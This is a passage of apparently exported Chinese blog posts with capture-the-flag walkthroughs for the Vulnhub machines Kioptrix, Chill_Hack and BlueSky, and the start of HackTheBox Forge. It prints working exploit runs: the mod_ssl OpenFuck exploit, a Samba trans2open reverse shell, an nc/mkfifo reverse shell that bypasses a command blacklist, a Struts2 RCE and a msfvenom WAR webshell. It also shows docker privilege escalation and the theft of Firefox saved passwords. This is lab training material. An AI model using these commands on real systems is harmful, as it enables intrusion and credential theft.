rpcinfo:\n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|   100000  2            111/udp   rpcbind\n|   100024  1           1024/tcp   status\n|_  100024  1           1024/udp   status\n139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)\n443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-title: 400 Bad Request\n| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--\n| Not valid before: 2009-09-26T09:32:06\n|_Not valid after:  2010-09-26T09:32:06\n|_ssl-date: 2021-11-12T13:50:26+00:00; +1h01m55s from scanner time.\n| sslv2:\n|   SSLv2 supported\n|   ciphers:\n|     SSL2_RC2_128_CBC_WITH_MD5\n|     SSL2_RC4_128_WITH_MD5\n|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5\n|     SSL2_RC4_64_WITH_MD5\n|     SSL2_RC4_128_EXPORT40_WITH_MD5\n|     SSL2_DES_192_EDE3_CBC_WITH_MD5\n|_    SSL2_DES_64_CBC_WITH_MD5\n1024/tcp open  status      1 (RPC #100024)\nMAC Address: 00:0C:29:55:CB:15 (VMware)\nDevice type: general purpose\nRunning: Linux 2.4.X\nOS CPE: cpe:/o:linux:linux_kernel:2.4\nOS details: Linux 2.4.9 - 2.4.18 (likely embedded)\nNetwork Distance: 1 hop\n\nHost script results:\n|_clock-skew: 1h01m54s\n|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n|_smb2-time: Protocol negotiation failed (SMB2)\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.42 ms 192.168.1.102\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 69.83 seconds\n```\n\n这东西稍微的有点多，一个个看\n\n![](Vulnhub-Kioptrix/image1.png)\n\n80端口好像也没啥可看的？扫个目录看看吧\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# gobuster dir -w /usr/share/dirb/wordlists/common.txt -x .php -e -t 200 -u http://192.168.1.102/\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.1.102/\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/dirb/wordlists/common.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              php\n[+] Expanded:                true\n[+] Timeout:                 10s\n===============================================================\n2021/11/12 07:52:42 Starting gobuster in directory enumeration mode\n===============================================================\nhttp://192.168.1.102/.htaccess            (Status: 403) [Size: 273]\nhttp://192.168.1.102/.htpasswd            (Status: 403) [Size: 273]\nhttp://192.168.1.102/.hta                 (Status: 403) [Size: 268]\nhttp://192.168.1.102/.htaccess.php        (Status: 403) [Size: 277]\nhttp://192.168.1.102/.htpasswd.php        (Status: 403) [Size: 277]\nhttp://192.168.1.102/.hta.php             (Status: 403) [Size: 272]\nhttp://192.168.1.102/~root                (Status: 403) [Size: 269]\nhttp://192.168.1.102/~operator            (Status: 403) [Size: 273]\nhttp://192.168.1.102/cgi-bin/             (Status: 403) [Size: 272]\nhttp://192.168.1.102/index.html           (Status: 200) [Size: 2890]\nhttp://192.168.1.102/manual               (Status: 301) [Size: 294] [--> http://127.0.0.1/manual/]\nhttp://192.168.1.102/mrtg                 (Status: 301) [Size: 292] [--> http://127.0.0.1/mrtg/]\nhttp://192.168.1.102/usage                (Status: 301) [Size: 293] [--> http://127.0.0.1/usage/]\nhttp://192.168.1.102/test.php             (Status: 200) [Size: 27]\n```\n\n挨个去看看\n\n![](Vulnhub-Kioptrix/image2.png)\n\n几个页面都会跳转到127.0.0.1，只有test.php可以访问，而且还没什么东西\n\n继续回到端口看看吧\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# smbclient -L 192.168.1.102                                                                                                            1 ⨯\nprotocol negotiation failed: NT_STATUS_IO_TIMEOUT\n```\n\n## 漏洞利用\n\n看到80端口后面的mod_ssl/2.8.4，去搜一下有没有Exploit\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# searchsploit mod_ssl\n------------------------------------------------------------------------------------------------------------ ---------------------------------\n Exploit Title                                                                                              |  Path\n------------------------------------------------------------------------------------------------------------ ---------------------------------\nApache mod_ssl 2.0.x - Remote Denial of Service                                                             | linux/dos/24590.txt\nApache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                                  | multiple/dos/21575.txt\nApache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                        | unix/remote/21671.c\nApache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                  | unix/remote/764.c\nApache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                  | unix/remote/47080.c\nApache mod_ssl OpenSSL < 0.9.6d / < 0.9.7-beta2 - 'openssl-too-open.c' SSL2 KEY_ARG Overflow                | unix/remote/40347.txt\n------------------------------------------------------------------------------------------------------------ ---------------------------------\nShellcodes: No Results\n```\n\n对比mod_ssl/2.8.4版本，有三个版本合适，挨个进行测试\n\n经过测试发现unix/remote/47080.c是可以使用的，咱们给他复制出来\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# locate unix/remote/47080.c\n/usr/share/exploitdb/exploits/unix/remote/47080.c\n\n┌──(root💀kali)-[~/Desktop]\n└─# cp /usr/share/exploitdb/exploits/unix/remote/47080.c ./\n```\n\n然后使用gcc进行编译\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# gcc -o exploit 47080.c -lcrypto\n47080.c:21:10: fatal error: openssl/ssl.h: 没有那个文件或目录\n   21 | #include <openssl/ssl.h>\n      |          ^~~~~~~~~~~~~~~\ncompilation terminated.\n```\n\n提示报错了，经过百度搜索，发现是缺少了组件\n\n咱们使用apt进行安装\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# apt-get install libssl1.0-dev\n```\n\n然后再进行编译\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# gcc -o exploit 47080.c -lcrypto\n\n┌──(root💀kali)-[~/Desktop]\n└─# ls\n47080.c  exploit\n```\n\n去运行一下\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# ./exploit\n\n*******************************************************************\n* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *\n*******************************************************************\n* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *\n* #hackarena  irc.brasnet.org                                     *\n* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *\n* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *\n* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *\n*******************************************************************\n\n: Usage: ./exploit target box [port] [-c N]\n\n  target - supported box eg: 0x00\n  box - hostname or IP address\n  port - port for ssl connection\n  -c open N connections. (use range 40-50 if u dont know)\n```\n\n运行后得到了运行参数，咱们还得先找到对应的版本\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# ./exploit | grep apache-1.3.20                                                                                                        1 ⨯\n        0x02 - Cobalt Sun 6.0 (apache-1.3.20)\n        0x27 - FreeBSD (apache-1.3.20)\n        0x28 - FreeBSD (apache-1.3.20)\n        0x29 - FreeBSD (apache-1.3.20+2.8.4)\n        0x2a - FreeBSD (apache-1.3.20_1)\n        0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)\n        0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)\n        0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)\n        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1\n        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2\n        0x7e - Slackware Linux 8.0 (apache-1.3.20)\n        0x86 - SuSE Linux 7.3 (apache-1.3.20)\n```\n\n符合条件的有两个，分别是0x6a和0x6b，分别去测试一下\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# ./exploit 0x6a 192.168.1.102 -c 40\n\n*******************************************************************\n* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *\n*******************************************************************\n* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *\n* #hackarena  irc.brasnet.org                                     *\n* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *\n* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *\n* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *\n*******************************************************************\n\nConnection... 40 of 40\nEstablishing SSL connection\ncipher: 0x4043808c   ciphers: 0x80f8070\nReady to send shellcode\nSpawning shell...\nGood Bye!\n```\n\n0x6a测试失败，现在去测试一下0x6b\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# ./exploit 0x6b 192.168.1.102 -c 40\n\n*******************************************************************\n* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *\n*******************************************************************\n* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *\n* #hackarena  irc.brasnet.org                                     *\n* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *\n* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *\n* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *\n*******************************************************************\n\nConnection... 40 of 40\nEstablishing SSL connection\ncipher: 0x4043808c   ciphers: 0x80f81e8\nReady to send shellcode\nSpawning shell...\nbash: no job control in this shell\nbash-2.05$\nd.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo\n--09:32:52--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c\n           => `ptrace-kmod.c'\nConnecting to dl.packetstormsecurity.net:443... connected!\n\nUnable to establish SSL connection.\n\nUnable to establish SSL connection.\ngcc: ptrace-kmod.c: No such file or directory\ngcc: No input files\nrm: cannot remove `ptrace-kmod.c': No such file or directory\nbash: ./exploit: No such file or directory\nbash-2.05$\nbash-2.05$ whoami&&id\nwhoami&&id\napache\nuid=48(apache) gid=48(apache) groups=48(apache)\n```\n\n0x6b成功getshell，现在去提权\n\n## 权限提升\n\n经过测试后没有发现提权的点，但是发现了另一种root权限的方法，那就是用msf的模块\n\n```\nuse exploit/linux/samba/trans2open\nset payload linux/x86/shell_reverse_tcp\nshow options\nset rhosts 192.168.1.102\nexploit\n\nmsf6 exploit(linux/samba/trans2open) > exploit\n\n[*] Started reverse TCP handler on 192.168.1.106:4444\n[*] 192.168.1.102:139 - Trying return address 0xbffffdfc...\n[*] 192.168.1.102:139 - Trying return address 0xbffffcfc...\n[*] 192.168.1.102:139 - Trying return address 0xbffffbfc...\n[*] 192.168.1.102:139 - Trying return address 0xbffffafc...\n[*] 192.168.1.102:139 - Trying return address 0xbffff9fc...\n[*] 192.168.1.102:139 - Trying return address 0xbffff8fc...\n[*] Command shell session 1 opened (192.168.1.106:4444 -> 192.168.1.102:1036) at 2021-11-13 07:04:24 -0500\n\n[*] Command shell session 2 opened (192.168.1.106:4444 -> 192.168.1.102:1037) at 2021-11-13 07:04:25 -0500\n[*] Command shell session 3 opened (192.168.1.106:4444 -> 192.168.1.102:1038) at 2021-11-13 07:04:26 -0500\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=99(nobody)\n```\n\n用msf的模块打就是root，至于为啥我也没研究出个所以然来（主要因为菜）\n\n知道原因的小伙伴可以告诉我一下\n","tags":["Vulnhub"]},{"title":"Chill_Hack - Vulnhub","url":"/2021/10/17/Vulnhub/Vulnhub -Chill_Hack/","content":"\n# Vulnhub-Chill_Hack\n\n靶场实战 Vulnhub-Chill_Hack\n\n靶场下载地址https://www.vulnhub.com/entry/chill-hack-1,622/\n\n废话不多说 直接开始\n\n第一步使用kali扫描内网IP\n\nArp-scan –l\n\n![](Vulnhub-Chill_Hack/image1.png)\n\n获得靶场IP为192.168.72.132\n\n对靶场进行端口扫描\n\nNmap –A –v 192.168.72.132\n\n![](Vulnhub-Chill_Hack/image2.png)\n\n发现存在21 22 80三个端口\n\n21端口存在匿名访问 咱们先访问看看\n\n用户名使用anonymous 密码为空\n\n![](Vulnhub-Chill_Hack/image3.png)\n\n成功登陆\n\n查看有什么文件\n\n![](Vulnhub-Chill_Hack/image4.png)\n\n发现存在一个txt文件 我们查看一下\n\n使用get下载到本地然后打开查看\n\n![](Vulnhub-Chill_Hack/image5.png)\n\n![](Vulnhub-Chill_Hack/image6.png)\n\n嗯…好像也没什么用\n\n我们还是先看看80端口的Web服务吧\n\n![](Vulnhub-Chill_Hack/image7.png)\n\n看上去像是一个体育比赛的官网？\n\n扫描一下目录\n\n![](Vulnhub-Chill_Hack/image8.png)\n\n发现了一个有趣的URL [http://192.168.72.132/secret/index.php](http://192.168.72.132/secret/index.php)\n\n可以执行命令\n\n![](Vulnhub-Chill_Hack/image9.png)\n\nOK 突破口应该就在这里了\n\n当我输入ls想查看一下当前目录文件的时候\n\n![](Vulnhub-Chill_Hack/image10.png)\n\n这时我想起来我们那个note.txt文件里的话是什么意思\n\n证明这里有过滤 就是不知道是白名单还是黑名单了\n\n经过我大量测试 该靶场为黑名单验证\n\n那就好办了 绕过吧\n\n出去吃了个饭 回来突然来了思路\n\n将两个指令结合起来 不就成了吗\n\n例如 ls会被拦截\n\n那就 whoami;ls\n\n![](Vulnhub-Chill_Hack/image11.png)\n\n成功执行 我可真是个小机灵\n\n将该方法和NC反弹一结合 不就拿到shell了？\n\n经过大量测试 发现可用的反弹语句为\n\ndir;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1|nc 192.168.72.130 7777 > /tmp/f\n\n本机监听 nc –lvp 7777\n\n执行 成功拿到一个shell\n\n![](Vulnhub-Chill_Hack/image12.png)\n\n![](Vulnhub-Chill_Hack/image13.png)\n\n该shell权限还是较低 并且操作非常不便利 咱们要想办法提权\n\n查找python版本\n\nWhich python\n\n![](Vulnhub-Chill_Hack/image14.png)\n\n成功确认python版本为python3\n\n使用python3将shell进行提升\n\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n\n![](Vulnhub-Chill_Hack/image15.png)\n\n成功\n\n该命令不会对电脑有什么危害 但偶尔会有奇效\n\n![](Vulnhub-Chill_Hack/image16.png)\n\n在这个文件夹下 这个hacker.php引起了我的注意 查看一下吧\n\n![](Vulnhub-Chill_Hack/image17.png)\n\n在黑暗中我会看到答案？真就人均谜语人呗\n\n在hacker.php中 我们看到images文件夹中有一张图片 应该就是线索所在\n\n咱们进入images文件夹\n\n![](Vulnhub-Chill_Hack/image18.png)\n\nOK 咱们把这张图片用nc下载下来 也可以用python3开启http服务进行下载 不过我图省事儿 就nc了吧\n\n本地电脑运行 nc –nvlp 4444 > hacker-with-laptop_23-2147985341.jpg\n\n咱们保持原名不动\n\nShell里运行 nc 192.168.72.130 4444 -w 4 < hacker-with-laptop_23-2147985341.jpg\n\n![](Vulnhub-Chill_Hack/image19.png)\n\nOK 稍等一会儿 成功下载下来\n\n根据hacker.php中的提示 在黑暗中我们会看到答案 这不就是妥妥的图片隐写吗 不愧是我 最近的柯南没白看\n\n使用steghide查看\n\n![](Vulnhub-Chill_Hack/image20.png)\n\n果然存在一个名为backup.zip的压缩包 不愧是我\n\n依然使用steghide进行解压\n\n![](Vulnhub-Chill_Hack/image21.png)\n\nOK 得到了这个名为backup.zip的压缩包文件\n\n我们现在将他解压缩\n\n![](Vulnhub-Chill_Hack/image22.png)\n\n我丢啊 这里来个密码 成吧 再找\n\n找？找是不可能找的 就咱这暴脾气 爆他！\n\n![](Vulnhub-Chill_Hack/image23.png)\n\n使用zip2johb生成了一个backup.john文件\n\n咱们使用john爆他\n\n![](Vulnhub-Chill_Hack/image24.png)\n\nOK 完成\n\n咱们使用john查看密码\n\n![](Vulnhub-Chill_Hack/image25.png)\n\n密码为pass1word 行吧 经典弱口令\n\n接下来咱们解压文件\n\n![](Vulnhub-Chill_Hack/image26.png)\n\n成功解压出来\n\n查看解压出来的文件\n\n![](Vulnhub-Chill_Hack/image27.png)\n\n好家伙 还有个base64编码 解密吧\n\n![](Vulnhub-Chill_Hack/image28.png)\n\n返回我们的shell 查看一下用户\n\n![](Vulnhub-Chill_Hack/image29.png)\n\n使用我们得到的密码登入进用户anurodh\n\n![](Vulnhub-Chill_Hack/image30.png)\n\n成功登入\n\n确认账户密码没问题了 这时候咱们就要用到一开始扫描出的22端口了\n\n毕竟shell是不稳定的 使用ssh服务登入吧\n\n![](Vulnhub-Chill_Hack/image31.png)\n\n成功登入 有一个稳定的权限的感觉太爽了\n\n这时候肯定就是提权了是吧\n\n直接使用经典的sudo su\n\n![](Vulnhub-Chill_Hack/image32.png)\n\n失败了 嗯… 情理之中 意料之外\n\n使用sudo –l查看sudo的权限 发现apaar可以提权？那就造他\n\n![](Vulnhub-Chill_Hack/image33.png)\n\n查看apaar文件夹下的文件\n\n![](Vulnhub-Chill_Hack/image34.png)\n\n发现apaar下有个txt文件 但由于权限文件我们无法访问\n\n但上述提到了 apaar下有个sh脚本我们可以执行 那就执行它\n\n![](Vulnhub-Chill_Hack/image35.png)\n\n它需要一个名字 咱们随便输入即可\n\n![](Vulnhub-Chill_Hack/image36.png)\n\n执行完毕了 但我不知道它有效果\n\n那就阅读一下吧\n\n![](Vulnhub-Chill_Hack/image37.png)\n\n这个批处理 有点意思啊 似乎可以命令执行\n\n![](Vulnhub-Chill_Hack/image38.png)\n\n尝试成功 有点意思\n\n既然我们没有权限读取local.txt文件 那就让apaar来读取吧\n\n![](Vulnhub-Chill_Hack/image39.png)\n\n啊这 我还以为是什么提权的东西呢 结果你告诉我 这就是个flag？\n\n那也行吧 flag1 get {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}\n\nOK 咱们继续找其他方法提权吧\n\n输入id查看权限\n\n![](Vulnhub-Chill_Hack/image40.png)\n\n嗯？docker？要素察觉\n\n我们使用一些提权辅助工具[https://gtfobins.github.io/](https://gtfobins.github.io/) 在里面搜搜docker\n\n![](Vulnhub-Chill_Hack/image41.png)\n\n使用此命令即可提权docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n\n![](Vulnhub-Chill_Hack/image42.png)\n\n![](Vulnhub-Chill_Hack/image43.png)\n\n提权成功\n\n进入root目录 拿到最后一个flag\n\n![](Vulnhub-Chill_Hack/image44.png)\n\nFlag2 get {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}\n\n总结语：怎么说呢，这个靶场还是挺有意思的。我起初以为就是简单的一个命令执行getshell以后一个脚本提权就拿下了。没想到还有这么多步骤，挺严谨的吧\n","tags":["Vulnhub"]},{"title":"BlueSky - Vulnhub","url":"/2021/10/07/Vulnhub/Vulnhub -BlueSky/","content":"\n# 靶场实战 Vulnhub-BlueSky\n\n首先使用kali扫描靶场的IP地址\n\nArp-scan –l\n\n![](Vulnhub-BlueSky/image1.png)\n\n对比MAC地址 成功得到靶场IP地址192.168.72.131\n\n进行端口扫描\n\nNmap –Sv –v 192.168.72.131\n\n![](Vulnhub-BlueSky/image2.png)\n\n开放了端口22和8080\n\n22为SSH端口，突破多半都是弱口令，咱们先不考虑这种情况，访问8080的WEB服务器看看\n\n[http://192.168.72.131:8080](http://192.168.72.131:8080/)\n\n![](Vulnhub-BlueSky/image3.png)\n\n访问后发现是tomcat 9.0.40 第一时间想到了tomcat的cve漏洞\n\n使用searchsploit搜索 tomcat 9.0.40的漏洞\n\n![](Vulnhub-BlueSky/image4.png)\n\n嗯…好像没有\n\n那就测试一波0day吧(弱口令)\n\nTomcat/tomcat\n\nAdmin/admin\n\n![](Vulnhub-BlueSky/image5.png)\n\nOK 确认没有0day\n\n那就只能找该版本存在的漏洞了\n\n在百度找到一个struts2-showcase的漏洞（s2-048远程代码执行）\n\n好家伙 直接上工具了哈 就懒得再测试了\n\nurl: [http://192.168.72.131:8080/struts2-showcase/index.action](http://192.168.72.131:8080/struts2-showcase/index.action)\n\n![](Vulnhub-BlueSky/image6.png)\n\n好家伙 这个URL我爆目录还没爆出来 在网上搜索相关漏洞才找到\n\n下载exp\n\ngit clone [https://github.com/jrrdev/cve-2017-5638.git](https://github.com/jrrdev/cve-2017-5638.git)\n\n测试是否存在漏洞\n\npython exploit.py \"http://192.168.72.131:8080/struts2-showcase/index.action\" \"whoami\"\n\n![](Vulnhub-BlueSky/image7.png)\n\nwhoami执行成功\n\n查看是否存在nc权限\n\npython exploit.py \"http://192.168.72.131:8080/struts2-showcase/index.action\" \"nc\"\n\n![](Vulnhub-BlueSky/image8.png)\n\n存在nc权限的 但似乎没有nc –e的权限 得通过其他方式反弹shell了\n\n首先使用mknod建立管道\n\nPython exploit.py \"http://192.168.72.131:8080/struts2-showcase/index.action\" \"mknod /tmp/backpipe p\"\n\n![](Vulnhub-BlueSky/image9.png)\n\nKali监听4444端口\n\nNc –nvlp 4444\n\n![](Vulnhub-BlueSky/image10.png)\n\n反弹shell，将内容传递物使用管道文件p作为桥梁，进行数据重定向传递\n\npython exploit.py \"http://192.168.72.131:8080/struts2-showcase/index.action\" -c \"/bin/sh 0</tmp/p | nc 192.168.72.133 4444 1>/tmp/p\"\n\n![](Vulnhub-BlueSky/image11.png)\n\n正常来说现在kali是会获取到一个nc的shell的，但我这边不知道什么原因无法成功，先教大家此方法继续操作的方法，我再演示我自己做的替代的方法\n\n获取到shell后在shell内运行\n\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n因为靶机环境内没有python2的环境，所以我们使用python3提升为一个交互式shell就可以了\n\n第二种方法：\n\n第二种方法我们使用window来进行渗透\n\n首先使用struts2的图形化验证工具进行漏洞验证\n\n![](Vulnhub-BlueSky/image12.png)\n\n得到目录地址\n\nwebpath:/usr/local/tomcat/webapps/struts2-showcase/\n\n直接上传大马会超出字节限制\n\n上传冰蝎的马冰蝎会无法识别webshell的密码\n\n直接上传蚁剑的马也会超出字节限制\n\n那么怎么办呢？\n\n很好解决，首先我们上传一个下载文件的一句话木马\n\n![](Vulnhub-BlueSky/image13.png)\n\n得到webshell地址\n\n[http://192.168.72.131:8080/struts2-showcase/111.jsp](http://192.168.72.131:8080/struts2-showcase/111.jsp)\n\n然后在本地搭建一个web服务器，把要使用的一句话木马或大马放在里面，使用该一句话木马进行访问下载\n\n[http://192.168.72.131:8080/struts2-showcase/111.jsp?f=/usr/local/tomcat/webapps/struts2-showcase/222.jsp&u=http://192.168.0.159/333.jsp](http://192.168.72.131:8080/struts2-showcase/111.jsp?f=/usr/local/tomcat/webapps/struts2-showcase/222.jsp&u=http://192.168.0.159/333.jsp)\n\n上面的222.jsp是要保存的webshell马名字\n\n333.jsp是我们在本地web服务器内储存的名字\n\n111.jsp是当前的下载马\n\n![](Vulnhub-BlueSky/image14.png)\n\n成功下载蚁剑的一句话木马\n\n![](Vulnhub-BlueSky/image15.png)\n\n可以成功访问文件，但我们发现该一句话木马似乎无法执行命令，那怎么办呢？\n\n小问题，我们利用tomcat本身的漏洞进行提权就好了\n\n首先找到tomcat的账号木马\n\n地址：/usr/local/tomcat/conf/tomcat-users.xml\n\n第45行\n\n<user username=\"admin\" password=\"6mzf3>gfZ.pN8_Mp\" roles=\"manager-gui\"/>\n\n成功得到\n\n账号：admin\n\n密码：6mzf3>gfZ.pN8_Mp\n\n![](Vulnhub-BlueSky/image16.png)\n\n注意：此方法较为麻烦，主要用于无法使用nc弹回shell的情况下使用，我这边使用了各个方法都无法弹回，不得已之下才使用这个方法\n\n现在我们回到网页去登录账号密码\n\n![](Vulnhub-BlueSky/image17.png)\n\n登陆后的状态\n\n![](Vulnhub-BlueSky/image18.png)\n\n我们发现下面可以部署文件，OK 那就好办了\n\n使用WAR木马上传反弹shell就搞定了\n\n使用msfvenom生成war马\n\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.72.133 LPORT=5555 -f war -o shell.war\n\n![](Vulnhub-BlueSky/image19.png)\n\nOK 我们去上传\n\n![](Vulnhub-BlueSky/image20.png)\n\n成功上传后，我们可以看到/shell 这就是我们上传的war马\n\n在kali中监听5555端口\n\nNc –nvlp 5555\n\n![](Vulnhub-BlueSky/image21.png)\n\n然后去访问我们上传的war马\n\ncurl http://192.168.72.131:8080/shell/\n\n![](Vulnhub-BlueSky/image22.png)\n\nOK 我们成功获取到一个shell\n\n![](Vulnhub-BlueSky/image23.png)\n\n同样的我们使用python3获取一个交互式shell\n\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n![](Vulnhub-BlueSky/image24.png)\n\n查看user.txt文件 成功获取user账户的flag\n\n![](Vulnhub-BlueSky/image25.png)\n\n我们查看所有文件\n\nLs –a\n\n![](Vulnhub-BlueSky/image26.png)\n\n在用户根目录下发现mozilla firefox浏览器文件\n\n对我来说，最想要得到的就是它的用户名密码记录\n\n不同版本的Firefox保存密码记录的文件名称不同，在网上找到firefox浏览器存储用户名密码的文件是logins.json（版本号大于等于32.0）或者signons.sqlite（版本号大于等于3.5，小于32.0），\n\n具体信息参考：[http://kb.mozillazine.org/Profile_folder_-_Firefox](http://kb.mozillazine.org/Profile_folder_-_Firefox)\n\n进入位置\n\n.mozilla/firefox/fvbljmev.default-release\n\n可以看到两个文件\n\nkey4.db logins.json\n\n我们要把这两个文件搞出来\n\n使用python3开启web服务器\n\npython3 -m http.server 6666\n\n使用wget成功拷贝两个文件\n\nwget [http://192.168.72.131:6666/logins.json](http://192.168.72.131:6666/logins.json)\n\nwget [http://192.168.72.131:6666/key4.db](http://192.168.72.131:6666/key4.db)\n\n![](Vulnhub-BlueSky/image27.png)\n\n下载解密脚本\n\n[https://github.com/lclevy/firepwd](https://github.com/lclevy/firepwd)\n\ngit clone https://github.com/lclevy/firepwd.git\n\ncd firepwd\n\npip3 install -r requirements.txt\n\n![](Vulnhub-BlueSky/image28.png)\n\n运行python3 firepwd.py\n\n[https://twitter.com:b'minhtuan',b'skysayohyeah](https://twitter.com:b'minhtuan',b'skysayohyeah)'\n\n得到账号：minhtuan\n\n得到密码：skysayohyeah\n\n我们使用sudo –l查看sudo权限\n\n![](Vulnhub-BlueSky/image29.png)\n\n权限挺高 直接sudo su即可成功提权\n\n![](Vulnhub-BlueSky/image30.png)\n\n![](Vulnhub-BlueSky/image31.png)\n\n成功拿到root权限的flag\n\n本次靶场完成\n","tags":["Vulnhub"]},{"title":"Forge - Hackthebox","url":"/2021/09/28/Hackthebox/Medium/Hackthebox-Forge/","content":"\n# Hackthebox - Forge\n## 靶场信息\n![](Hackthebox-Forge/image1.png)\n\n# 靶场类型\n![](Hackthebox-Forge/image2.png)\n\n## 信息搜集\n首先使用nmap扫描一下端口\n\n```Plain Text\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.111\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-26 21:51 EDT\nWarning: 10.10.11.111 giving up on port because retransmission cap hit (10).\nNmap scan report for 10.10.11.111\nHost is up (0.35s latency).\nNot shown: 65532 closed ports\nPORT   STATE    SERVICE VERSION\n21/tcp filtered ftp\n22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)\n|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)\n|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)\n80/tcp open     http    Apache httpd 2.4.41\n|_http-title: Did not follow redirect to http://forge.htb\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=9/26%OT=22%CT=1%CU=32048%PV=Y%DS=2%DC=T%G=Y%TM=615123F\nOS:0%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1\nOS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   358.39 ms 10.10.14.1\n2   358.42 ms 10.10.11.111\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP 